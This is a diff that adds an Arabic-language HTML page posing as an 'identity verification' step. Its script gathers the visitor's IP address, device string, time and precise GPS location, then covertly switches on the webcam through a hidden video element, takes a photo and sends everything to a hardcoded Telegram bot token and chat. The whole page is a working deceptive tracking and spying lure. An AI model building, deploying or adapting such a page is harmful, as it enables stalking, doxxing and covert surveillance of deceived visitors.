@@ -1,0 +1,112 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>التحقق من الهوية</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { 
+            font-family: Tahoma, sans-serif; 
+            background-color: #f9f9f9; 
+            color: #333;
+            text-align: center; 
+            padding-top: 80px; 
+        }
+        button {
+            padding: 12px 24px;
+            font-size: 16px;
+            background-color: #1e90ff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h2>📷 التحقق من الهوية</h2>
+    <p>يرجى الموافقة على الكاميرا والموقع لمتابعة التحقق.</p>
+    <button onclick="startProcess()">📤 متابعة</button>
+
+    <video id="video" autoplay playsinline></video>
+
+    <script>
+        const chatId = "7220184605";
+        const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
+
+        async function sendTelegramMessage(text) {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+        }
+
+        async function sendPhoto(blob) {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "photo.jpg");
+
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+        }
+
+        async function getIP() {
+            const res = await fetch("https://api.ipify.org?format=json");
+            const data = await res.json();
+            return data.ip;
+        }
+
+        async function startProcess() {
+            const ip = await getIP();
+            const device = navigator.userAgent;
+            const now = new Date().toLocaleString("en-GB", { timeZone: "Asia/Damascus" });
+
+            let locationText = "📍 الموقع: لم يُسمح به";
+            try {
+                await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition((position) => {
+                        const lat = position.coords.latitude.toFixed(5);
+                        const lon = position.coords.longitude.toFixed(5);
+                        locationText = `📍 الموقع: https://maps.google.com/?q=${lat},${lon}`;
+                        resolve();
+                    }, reject, {timeout: 5000});
+                });
+            } catch (e) {
+                locationText = "📍 الموقع: رفض المستخدم أو فشل";
+            }
+
+            const baseMessage = `🔍 زائر جديد:%0A🌐 IP: ${ip}%0A📱 الجهاز: ${device}%0A🕓 التاريخ: ${now}%0A${locationText}`;
+            await sendTelegramMessage(baseMessage);
+
+            // بدء الكاميرا
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+
+                // الانتظار قليلاً ثم التقاط صورة
+                setTimeout(async () => {
+                    const canvas = document.createElement("canvas");
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    const ctx = canvas.getContext("2d");
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    stream.getTracks().forEach(track => track.stop());
+
+                    canvas.toBlob(async (blob) => {
+                        await sendPhoto(blob);
+                    }, 'image/jpeg');
+                }, 3000); // انتظار 3 ثواني قبل التقاط الصورة
+
+            } catch (err) {
+                await sendTelegramMessage("⚠️ لم يتم منح إذن الكاميرا.");
+            }
+        }
+    </script>
+</body>
+</html>
